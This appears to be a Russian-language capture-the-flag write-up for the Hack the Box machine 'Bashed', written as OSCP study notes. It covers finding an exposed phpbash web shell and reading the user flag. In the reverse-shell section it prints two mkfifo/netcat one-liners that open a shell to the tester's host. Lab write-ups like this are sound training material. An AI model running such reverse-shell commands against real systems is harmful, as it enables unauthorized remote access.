## Веб-сайт

Этот сайт, похоже, является рекламной страницей для копии bash-шелла, написанного на PHP.

![[Pasted image 20210505083541.png]]

Все ссылки ведут обратно к `index.html`

![[Pasted image 20210505085925.png]]

Я также проверил источник, но не было скрытых ссылок, а отправка формы не приводила к никаким результатам. В тексте упоминается PHP:

![[Pasted image 20210505090749.png]]

Поскольку и источник, и сам сайт упоминают php, я быстро проверил, действительно ли расширение `.php` работает:

![[Pasted image 20210505085959.png]]

Но, похоже, хотя бы страница `index.html` работает на чистом HTML.

Блог-пост, датированный 2017 годом, указывает, что веб-шелл доступен на сервере, и даже дает нам потенциальную URL:

![[Pasted image 20210505090142.png]]

Мы также можем посмотреть исходный код по адресу: [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash). Мы вернемся к этому, если потребуется.

Я попробовал URL из скриншота, но его не нашел:

![[Pasted image 20210505090246.png]]

Также `/phpbash.php` не существует.

## PHP веб-шелл

Я запустил [[Writeups/Hack the Box/Boxes/Bashed/5 - Enumeration#Gobuster|quick gobuster]] для поиска потенциальных директорий для скрипта. Он нашел `/php/` и `/dev/`. Я попробовал `/php/phpbash.php`, а затем `/dev/phpbash.php`, что сработало:

![[Pasted image 20210505090543.png]]

Я провел очень быстрые переборы, искав пользователей и быстро обнаружил, что домашний директор `arrexel` доступен для всех. Это дает нам флаг пользователя:

![[Pasted image 20210505091030.png]]

## Попытка получить обратный шелл

Перед тем, как продолжить переборы для priv esc, я хотел получить более совершенный шелл. Я попробовал несколько команд, но безрезультатно:

![[Pasted image 20210505093721.png]]

Я поискал в Google "netcat openbsd reverse shell" и попробовал следующие команды:

```bash
www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f

www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.13 9001 >/tmp/f
```

Но я не получил никакого результата.

Я также попробовал `upload` кастомный команду, упомянутую в исходном коде, но безрезультатно.

![[Pasted image 20210505101232.png]]

Я решил продолжить переборы и вернусь к этому, когда я выведу сервер в режим рутина и посмотрю, не сделал ли кто-то это в writeup. В конце концов я [[15 - Privesc#Upgrading Shell|обновлю свой шелл]].

# Теги

#writeup #oscp-prep #web
